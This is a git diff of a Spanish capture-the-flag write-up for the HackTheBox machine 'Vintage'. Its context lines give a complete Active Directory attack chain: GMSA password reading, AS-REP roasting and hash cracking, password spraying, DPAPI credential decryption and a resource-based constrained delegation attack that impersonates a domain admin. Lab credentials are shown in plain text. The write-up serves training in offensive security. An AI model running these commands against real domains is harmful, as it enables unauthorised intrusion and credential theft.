@@ -1,6 +1,6 @@
 ---
-hidden: true
 icon: desktop
+hidden: true
 layout:
   title:
     visible: true
@@ -16,7 +16,7 @@ layout:
 
 # Vintage
 
-<figure><img src="../../../../../.gitbook/assets/Vintage.png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/Vintage.png" alt="" width="563"><figcaption></figcaption></figure>
 
 ## Reconnaissance
 
@@ -26,7 +26,7 @@ Proceremos a realizar un reconocimiento con **nmap** para ver los puertos que es
 nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.45 -oG allPorts
 ```
 
-<figure><img src="../../../../../.gitbook/assets/2701_vmware_p7xif7Ff0w.png" alt="" width="452"><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2701_vmware_p7xif7Ff0w.png" alt="" width="452"><figcaption></figcaption></figure>
 
 Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX.
 
@@ -36,7 +36,7 @@ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,49
 ```
 {% endcode %}
 
-<figure><img src="../../../../../.gitbook/assets/2702_vmware_ml5LYerfu0.png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2702_vmware_ml5LYerfu0.png" alt="" width="563"><figcaption></figcaption></figure>
 
 Transformaremos el archivo XML obtenido en el resultado de **nmap** y lo transformaremos en un archivo HTML. Levantaremos un servidor HTTP con Python3.
 
@@ -48,7 +48,7 @@ python3 -m http.server 80
 
 Accederemos a[ http://localhost](http://localhost) y comprobaremos el resultado en un formato más cómodo para su análisis.
 
-<figure><img src="../../../../../.gitbook/assets/2703_vmware_Ld9CCXBwGw.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2703_vmware_Ld9CCXBwGw.png" alt=""><figcaption></figcaption></figure>
 
 Comprobaremos el nombre del dominio que nos enfrentamos, el nombre del equipo y que tipo de máquina nos enfrentamos.
 
@@ -58,7 +58,7 @@ netexec smb 10.10.11.45
 ldapsearch -x -H ldap://10.10.11.45 -s base | grep defaultNamingContext
 ```
 
-<figure><img src="../../../../../.gitbook/assets/2704_vmware_jan94AKyeH.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2704_vmware_jan94AKyeH.png" alt=""><figcaption></figcaption></figure>
 
 A través de la herramienta de **ldapsearch** procederemos a enumerar el dominio a través del LDAP, y nos encontramos que el nombre del Domain Controller del dominio es "DC01".
 
@@ -70,7 +70,7 @@ ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -
 ```
 {% endcode %}
 
-<figure><img src="../../../../../.gitbook/assets/2706_vmware_u11ImFFUVJ.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2706_vmware_u11ImFFUVJ.png" alt=""><figcaption></figcaption></figure>
 
 Procederemos a añadir las entradas en nuestro archivo **/etc/hosts**
 
@@ -78,7 +78,7 @@ Procederemos a añadir las entradas en nuestro archivo **/etc/hosts**
 catnp /etc/hosts | grep vintage
 ```
 
-<figure><img src="../../../../../.gitbook/assets/2705_vmware_LpKwHYLG4c.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2705_vmware_LpKwHYLG4c.png" alt=""><figcaption></figcaption></figure>
 
 ## Users Enumeration (ldapsearch)
 
@@ -94,7 +94,7 @@ ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -
 ```
 {% endcode %}
 
-<figure><img src="../../../../../.gitbook/assets/2707_vmware_Hh5hlgAjGh.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2707_vmware_Hh5hlgAjGh.png" alt=""><figcaption></figcaption></figure>
 
 Verificaremos el contenido del archivo "users.txt" se hayan almacenado correctamente los nombres de los usuarios del dominio.
 
@@ -102,7 +102,7 @@ Verificaremos el contenido del archivo "users.txt" se hayan almacenado correctam
 catnp users.txt
 ```
 
-<figure><img src="../../../../../.gitbook/assets/2708_vmware_bJIy1h5hnH.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2708_vmware_bJIy1h5hnH.png" alt=""><figcaption></figcaption></figure>
 
 ## NTLM is disabled? Testing Kerberos authentication&#x20;
 
@@ -122,7 +122,7 @@ netexec smb 10.10.11.45 -u 'P.Rosa' -p 'Rosaisbest123' -k
 netexec smb dc01.vintage.htb -u 'P.Rosa' -p 'Rosaisbest123' -k
 ```
 
-<figure><img src="../../../../../.gitbook/assets/2709_vmware_5DNqFd0ci1.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2709_vmware_5DNqFd0ci1.png" alt=""><figcaption></figcaption></figure>
 
 Debido a que debemos utilizar Kerberos para autenticarnos contra el Domain Controller, procederemos a configurar nuestra Kali para que no tengamos problemas a la hora de autenticarnos.
 
@@ -138,7 +138,7 @@ systemctl restart NetworkManager.service
 ntpdate -s 10.10.11.45
 ```
 
-<figure><img src="../../../../../.gitbook/assets/2720_vmware_bKdUBfQTLB.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2720_vmware_bKdUBfQTLB.png" alt=""><figcaption></figcaption></figure>
 
 ## SMB Enumeration
 
@@ -148,7 +148,7 @@ Realizando una enumeración del SMB mediante Kerberos a través de la herramient
 netexec smb dc01.vintage.htb -u 'P.Rosa' -p 'Rosaisbest123' -k --shares
 ```
 
-<figure><img src="../../../../../.gitbook/assets/2710_vmware_xrPBI83bEc.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2710_vmware_xrPBI83bEc.png" alt=""><figcaption></figcaption></figure>
 
 ## LDAP Enumeration (ldapdomaindump) - \[FAILED]
 
@@ -160,9 +160,9 @@ Por lo tanto, no podemos hacer uso de la herramienta para realizar una enueraci
 ldapdomaindump -u 'vintage.htb\P.Rosa' -p 'Rosaisbest123' 10.10.11.45 -o ldap
 ```
 
-<figure><img src="../../../../../.gitbook/assets/2711_vmware_sXWhg1WvaN.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2711_vmware_sXWhg1WvaN.png" alt=""><figcaption></figcaption></figure>
 
-## AS-REP Roas Attack (GetNPUsers) - \[FAILED]
+## AS-REP Roast Attack (GetNPUsers) - \[FAILED]
 
 Dado que disponemos de una potencial lista de usuarios del dominio válidos, procederemos a intentar realizar un **AS-REP Roast Attack** para solicitar un TGT (Ticket Granting Ticket) de aquellos usuarios que tengan el (DONT\_REQ\_PREAUTH) de Kerberos y así obtener su hash y posteriormente crackearlos de manera offline.
 
@@ -172,7 +172,7 @@ En este caso, ningún usuario cumple esa condición.
 impacket-GetNPUsers -no-pass -usersfile users.txt vintage.htb/ 2>/dev/null
 ```
 
-<figure><img src="../../../../../.gitbook/assets/2730_vmware_x8xibsZxpb.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2730_vmware_x8xibsZxpb.png" alt=""><figcaption></figcaption></figure>
 
 ## Kerberoasting Attack (GetUserSPNs) - \[FAILED]
 
@@ -186,7 +186,7 @@ impacket-GetUserSPNs vintage.htb/P.Rosa:Rosaisbest123 -k -dc-host dc01.vintage.h
 ```
 {% endcode %}
 
-<figure><img src="../../../../../.gitbook/assets/2731_vmware_9fQiArWQFo.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2731_vmware_9fQiArWQFo.png" alt=""><figcaption></figcaption></figure>
 
 ## BloodHound Enumeration
 
@@ -200,11 +200,11 @@ bloodhound-python -c All -ns 10.10.11.45 -u P.Rosa -p Rosaisbest123 -d vintage.h
 ```
 {% endcode %}
 
-<figure><img src="../../../../../.gitbook/assets/2714_vmware_EIuF3n7EEf.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2714_vmware_EIuF3n7EEf.png" alt=""><figcaption></figcaption></figure>
 
 Revisando el **BloodHound**, verificamos que hay dos usuarios Administradores del dominio (l.bianchi\_adm@vintage.htb) y (administrator@vintage.htb).
 
-<figure><img src="../../../../../.gitbook/assets/2715_vmware_TjZyxtjyxd.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2715_vmware_TjZyxtjyxd.png" alt=""><figcaption></figcaption></figure>
 
 También verificamos que el equipo (FS01$@vintage.htb) es miembro del grupo (domain computers@vintage.htb) y los miembros de este equipo tienen el privilegio de **ReadGMSAPassword** sobre el objeto (GMSA01$@vintage.htb).
 
@@ -212,7 +212,7 @@ Las cuentas GMSA (Group Managed Service Accounts) son objetos especiales en Acti
 
 La función principal es permitir que ciertas cuentas puedan recuperar su contraseña para ejecutar servicios locales con privilegios específicos. Sin embargo, si un atacante logra obtener el control de una cuenta autorizada, podría abusar de este privilegio y hacerse pasar por la GMSA.
 
-<figure><img src="../../../../../.gitbook/assets/2717_vmware_SnB64goRMA.png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2717_vmware_SnB64goRMA.png" alt="" width="563"><figcaption></figcaption></figure>
 
 Revisando los permisos de (GMSA01$@vintage.htb) nos damos cuenta que se puede añadir a él mismo sobre el grupo (SERVICEMANAGERS@vintage.htb) u otros usuarios.&#x20;
 
@@ -220,7 +220,7 @@ Formando parte del grupo (SERVICEMANAGERS@vintage.htb) se poseen los privilegios
 
 Este permiso equivale a un control total sobre estas 3 cuentas, permitiendo a cualquier miembro modificr la cuenta sin restricciones.
 
-<figure><img src="../../../../../.gitbook/assets/2719_vmware_v5DzNQyMNp.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2719_vmware_v5DzNQyMNp.png" alt=""><figcaption></figcaption></figure>
 
 ## Initial Access
 
@@ -236,7 +236,7 @@ impacket-getTGT vintage.htb/FS01$:fs01
 export KRB5CCNAME=FS01\$.ccache
 ```
 
-<figure><img src="../../../../../.gitbook/assets/2721_vmware_4Mhkvn4n3w.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2721_vmware_4Mhkvn4n3w.png" alt=""><figcaption></figcaption></figure>
 
 A través de la herramienta de **bloodyAD** y autenticándonos con el ticket TGT que tenemos almacenado, verificaremos que podemos leer la contraseña del GMSA y otbener su hash NTLM.
 
@@ -248,7 +248,7 @@ bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" -k get object 'GMSA01$' --at
 ```
 {% endcode %}
 
-<figure><img src="../../../../../.gitbook/assets/2722_vmware_5nRbkHGVJT.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2722_vmware_5nRbkHGVJT.png" alt=""><figcaption></figcaption></figure>
 
 ### **Abusing AddSelf Privileges with bloodyAD - Adding a Member to a Group**
 
@@ -263,7 +263,7 @@ Una vez obtenido el ticket TGT, lo almacenamos nuevamente en la variable KRB5CCN
 </strong><strong>export KRB5CCNAME=GMSA01\$.ccache
 </strong></code></pre>
 
-<figure><img src="../../../../../.gitbook/assets/2723_vmware_ZwN5Qpvwlz.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2723_vmware_ZwN5Qpvwlz.png" alt=""><figcaption></figcaption></figure>
 
 Finalmente, verificamos que el TGT sea válido y que esté correctamente almacenado en nuestra variable utilizando el siguiente comando:
 
@@ -271,7 +271,7 @@ Finalmente, verificamos que el TGT sea válido y que esté correctamente almacen
 klist -e
 ```
 
-<figure><img src="../../../../../.gitbook/assets/2724_vmware_LsaKrC2mx6.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2724_vmware_LsaKrC2mx6.png" alt=""><figcaption></figcaption></figure>
 
 Una vez tengamos el TGT del GMSA, procederemos a añadir al usuario (P.Rosa@vintage.htb) al grupo "SERVICEMANAGERS@vintage.htb) que disponemos de acceso a él a través del GMSA.&#x20;
 
@@ -283,7 +283,7 @@ bloodyAD -d vintage.htb --host dc01.vintage.htb -k add groupMember 'SERVICEMANAG
 ```
 {% endcode %}
 
-<figure><img src="../../../../../.gitbook/assets/2726_vmware_gSHTLURnaK.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2726_vmware_gSHTLURnaK.png" alt=""><figcaption></figcaption></figure>
 
 ### Abusing GenericAll Privileges - Enabling AS-REP Roasting and Manipulating User Accounts with bloodyAD&#x20;
 
@@ -299,13 +299,13 @@ export KRB5CCNAME=P.Rosa.ccache
 klist -e
 ```
 
-<figure><img src="../../../../../.gitbook/assets/2727_vmware_Z5SxJdH5j9.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2727_vmware_Z5SxJdH5j9.png" alt=""><figcaption></figcaption></figure>
 
 El objetivo de tener en este caso el privilegio de **GenericAll** sobre estas 3 cuentas, es de habilitarles la opción del (DONT\_REQ\_PREAUTH) para que sean susceptibles a un **AS-REP Roast Attack para** así lograr obtener sus respectivos TGT (Ticket Granting Tickets) y posteriormente crackear sus hashes de manera offline para obtener sus contraseñas.
 
 Revisando en BloodHound, nos damos cuenta que el usuario "svc\_sql@vintage.htb" se encuentra deshabilitado, por lo tanto, como tenemos control total sobre el usuario, también procederemos a quitarle la opción de que la cuenta se encuentre desactivada a través de la herramienta de **bloodyAD**.
 
-<figure><img src="../../../../../.gitbook/assets/2729_vmware_eU1xLKwzv2.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2729_vmware_eU1xLKwzv2.png" alt=""><figcaption></figcaption></figure>
 
 Procederemos a establecer con **bloodyAD** para que los 3 usuarios sean susceptibles al **AS-REP Roast Attack** y procederemos a activar nuevamente al usuario (svc\_sql@vintage.htb) a través de los siguientes comandos.
 
@@ -319,7 +319,7 @@ bloodyAD --host dc01.vintage.htb -d vintage.htb -k add uac 'SVC_SQL' -f DONT_REQ
 bloodyAD --host dc01.vintage.htb -d vintage.htb -k remove uac 'SVC_SQL' -f ACCOUNTDISABLE
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
 ### Performing an AS-REP Roast Attack again (GetNPUsers)
 
@@ -329,7 +329,7 @@ Debido que hemos habilitado a esos 3 usuarios la opción del (DONT\_REQ\_PREAUTH
 impacket-GetNPUsers -no-pass -usersfile users.txt vintage.htb/ 2>/dev/null
 ```
 
-<figure><img src="../../../../../.gitbook/assets/2732_vmware_IXXDDjlEDq.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2732_vmware_IXXDDjlEDq.png" alt=""><figcaption></figcaption></figure>
 
 Guardaremos los 3 hashes obtenidos en el archivo llamado "hashes" y a través de la herramienta de **john**, procederemos a intentar crackear los hashes para obtener la contraseña en texto plano.
 
@@ -341,7 +341,7 @@ catnp hashes
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes
 ```
 
-<figure><img src="../../../../../.gitbook/assets/2733_vmware_Uq4yNlE0SI.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2733_vmware_Uq4yNlE0SI.png" alt=""><figcaption></figcaption></figure>
 
 Validaremos a través de **netexec** de autenticarnos mediante Kerberos (-k) con el usuario y contraseña obtenidos. Comprobamos que efectivamente se tratan de credenciales válidas para el dominio.
 
@@ -349,7 +349,7 @@ Validaremos a través de **netexec** de autenticarnos mediante Kerberos (-k) con
 netexec smb dc01.vintage.htb -u 'svc_sql' -p 'Zer0the0ne' -k
 ```
 
-<figure><img src="../../../../../.gitbook/assets/2734_vmware_c7QJXzCo4n (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2734_vmware_c7QJXzCo4n (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Password spraying with Kerbrute
 
@@ -361,7 +361,7 @@ Verificamos que efectivamente ha validado que el usuario (C.Neri@vintage.htb) di
 kerbrute passwordspray -d vintage.htb --dc dc01.vintage.htb users.txt 'Zer0the0ne'
 ```
 
-<figure><img src="../../../../../.gitbook/assets/2736_vmware_ERUqYvK0Mv.png" alt="" width="521"><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2736_vmware_ERUqYvK0Mv.png" alt="" width="521"><figcaption></figcaption></figure>
 
 Validaremos nuevamente a través de **netexec** de que las credenciales si son válidas para el usuario (c.neri@vintage.htb).
 
@@ -369,13 +369,13 @@ Validaremos nuevamente a través de **netexec** de que las credenciales si son v
 netexec smb dc01.vintage.htb -u 'c.neri' -p 'Zer0the0ne' -k
 ```
 
-<figure><img src="../../../../../.gitbook/assets/2737_vmware_hQaNzfN0gy.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2737_vmware_hQaNzfN0gy.png" alt=""><figcaption></figcaption></figure>
 
 ### Abusing Win-RM - EvilWinRM
 
 Revisando en BloodHound los privilegios de este nuevo usuario, nos damos cuenta que tiene permisos de **CanPSRemote** sobre el Domain Controller (dc01.vintage.htb). Por lo tanto, a través de **evil-winrm** podremos conectarnos al DC.
 
-<figure><img src="../../../../../.gitbook/assets/2738_vmware_H6GwVhGxS3.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2738_vmware_H6GwVhGxS3.png" alt=""><figcaption></figcaption></figure>
 
 Debido que a través de NTLM no podemos autenticarnos, deberemos primeramente solicitar el TGT (Ticket Granting Ticket) del usuario para almacenar el ticket en la variable _KRB5CCNAME_ y posteriormente validar que el tiquet sea válido y se encuentre almacenado correctamente a través de los siguientes comandos.
 
@@ -387,7 +387,7 @@ export KRB5CCNAME=C.Neri.ccache
 klist -e
 ```
 
-<figure><img src="../../../../../.gitbook/assets/2739_vmware_K5OHPSkHau.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2739_vmware_K5OHPSkHau.png" alt=""><figcaption></figcaption></figure>
 
 Una vez tengamos el ticket TGT, procederemos a autenticarnos al **evil-winrm** mediante Kerberos para conectarnos al Domain Controller. Verificaremos el acceso y la flag del **user.txt**.
 
@@ -395,7 +395,7 @@ Una vez tengamos el ticket TGT, procederemos a autenticarnos al **evil-winrm** m
 evil-winrm -i dc01.vintage.htb -r vintage.htb
 ```
 
-<figure><img src="../../../../../.gitbook/assets/2740_vmware_6kM8pgOpXr.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2740_vmware_6kM8pgOpXr.png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -423,7 +423,7 @@ download C4BB96844A5C9DD45D5B6A9859252BA6
 ```
 {% endcode %}
 
-<figure><img src="../../../../../.gitbook/assets/2741_vmware_Zu2NVnO7KZ.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2741_vmware_Zu2NVnO7KZ.png" alt=""><figcaption></figcaption></figure>
 
 Después de descargar el archivo, accedimos al directorio **Microsoft\Protect**, que es donde se guardan los datos de protección relacionados con las credenciales. Navegamos hasta la carpeta correspondiente al SID del usuario **C.Neri**, **S-1-5-21-4024337825-2033394866-2055507597-1115**, y encontramos otro archivo relacionado con las credenciales protegidas.
 
@@ -445,7 +445,7 @@ download 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
 ```
 {% endcode %}
 
-<figure><img src="../../../../../.gitbook/assets/2742_vmware_yaRMMIhse0.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2742_vmware_yaRMMIhse0.png" alt=""><figcaption></figcaption></figure>
 
 Una vez descargados ambos archivos de manera local en nuestro equipo, utilizamos la herramienta **impacket-dpapi** para desencriptar la _master key_ de DPAPI.
 
@@ -459,7 +459,7 @@ impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b21
 ```
 {% endcode %}
 
-<figure><img src="../../../../../.gitbook/assets/2743_vmware_0uNZc0viwZ.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2743_vmware_0uNZc0viwZ.png" alt=""><figcaption></figcaption></figure>
 
 Validaremos si estas credenciales obtenidas son válidas a través de **netexec**, verificamos que efectivamente las credenciales encontradas son válidas para este usuario.
 
@@ -467,21 +467,21 @@ Validaremos si estas credenciales obtenidas son válidas a través de **netexec*
 netexec smb dc01.vintage.htb -u 'c.neri_adm' -p 'Uncr4ck4bl3P4ssW0rd0312' -k
 ```
 
-<figure><img src="../../../../../.gitbook/assets/2744_vmware_xUyfwByVJ2.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2744_vmware_xUyfwByVJ2.png" alt=""><figcaption></figcaption></figure>
 
 ### Abusing AllowedToAct privileges (Resource-based  Constrained Delegation \[RBCD Attack]) - (impacket-getST)
 
 Revisando en **BloodHound** los permisos que dispone este nuevo usuario (c.neri\_adm@vintage.htb) nos percatamos de que el usuario forma parte del grupo (delegatedadmins@vintage.htb).
 
-<figure><img src="../../../../../.gitbook/assets/2745_vmware_rTUeifXTyG.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2745_vmware_rTUeifXTyG.png" alt=""><figcaption></figcaption></figure>
 
 l investigar más a fondo los miembros de este grupo, descubrimos que (l.bianchi\_adm@vintage.htb), un Domain Admin, también pertenece a él.
 
-<figure><img src="../../../../../.gitbook/assets/2747_vmware_HqSmXJ0DZZ.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2747_vmware_HqSmXJ0DZZ.png" alt=""><figcaption></figcaption></figure>
 
 Tras analizar los permisos de los miembros de este grupo, encontramos que tienen permisos de **AllowedToAct** sobre el Domain Controller. Esto abre la puerta para explotar la delegación de servicios basada en recursos (RBCD) y realizar un ataque para movernos lateralmente o escalar privilegios en el dominio.
 
-<figure><img src="../../../../../.gitbook/assets/2748_vmware_hkyhcqqHLv.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2748_vmware_hkyhcqqHLv.png" alt=""><figcaption></figcaption></figure>
 
 Al revisar BloodHound, vimos que los miembros del grupo **DELEGATEDADMINS@VINTAGE.HTB** tienen permisos en el atributo **msds-AllowedToActOnBehalfOfOtherIdentity** en el controlador de dominio **DC01.VINTAGE.HTB**. Esto nos permite ejecutar una cadena de abuso **S4U2self/S4U2proxy** para suplantar a cualquier usuario del dominio en el sistema de destino y obtener un ticket de servicio válido como ese usuario.
 
@@ -490,7 +490,7 @@ Algunas consideraciones importantes:
 1. Los usuarios a los que intentemos suplantar no deben ser parte del grupo **Protected Users** ni tener delegación de privilegios revocados.
 2. El principal añadido al **msDS-AllowedToActOnBehalfOfOtherIdentity** debe tener un **Service Principal Name (SPN)** configurado para que el proceso de **S4U2self/S4U2proxy** funcione correctamente.
 
-<figure><img src="../../../../../.gitbook/assets/2749_vmware_NQGQ4eUEeB.png" alt="" width="446"><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2749_vmware_NQGQ4eUEeB.png" alt="" width="446"><figcaption></figcaption></figure>
 
 En este punto, el objetivo es conseguir una cuenta que disponga de un SPN ficticio para realizar el **RBCD Attack** y poder impersonar al Domain Admin (l.bianchi\_adm@vintage.htb).
 
@@ -513,7 +513,7 @@ export KRB5CCNAME=c.neri_adm.ccache
 klist -e
 ```
 
-<figure><img src="../../../../../.gitbook/assets/2751_vmware_GcQbPaPYdn.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2751_vmware_GcQbPaPYdn.png" alt=""><figcaption></figcaption></figure>
 
 Con el TGT del usuario (c.neri\_adm@vintage.htb) añadiremos al usuario (svc\_sql@vintage.htb) al grupo de (delegatedadmins@vintage.htb), ya que los miembros de este grupo pueden realizar el **RBCD Attack**.
 
@@ -531,7 +531,7 @@ klist -e
 ```
 {% endcode %}
 
-<figure><img src="../../../../../.gitbook/assets/2755_vmware_gpGsZMuLhb (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2755_vmware_gpGsZMuLhb (1).png" alt=""><figcaption></figcaption></figure>
 
 Con el TGT del usuario (P.Rosa@vintage.htb) procederemos a asignarle al usuario "svc\_sql@vintage.htb) al cual tenemos privilegios de **GenericAll** sobre él un SPN (ServicePrincipalName) ficticio.
 
@@ -549,7 +549,7 @@ klist -e
 ```
 {% endcode %}
 
-<figure><img src="../../../../../.gitbook/assets/2756_vmware_n8moCcEObQ.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2756_vmware_n8moCcEObQ.png" alt=""><figcaption></figcaption></figure>
 
 Obtenido el TGT del uisuario (svc\_sql@vintage.htb), teniendo el SPN ficticio asignado a este usuario, procederemos a realizar el **RBCD Attack** mediante la herramienta de **impacket-getST** para impersonar al usuario (l.bianchi\_admin@vintage.htb).
 
@@ -565,4 +565,4 @@ KRB5CCNAME=L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache wmiexec.py dc0
 ```
 {% endcode %}
 
-<figure><img src="../../../../../.gitbook/assets/2757_vmware_C4O6dGBMBq.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/2757_vmware_C4O6dGBMBq.png" alt=""><figcaption></figcaption></figure>
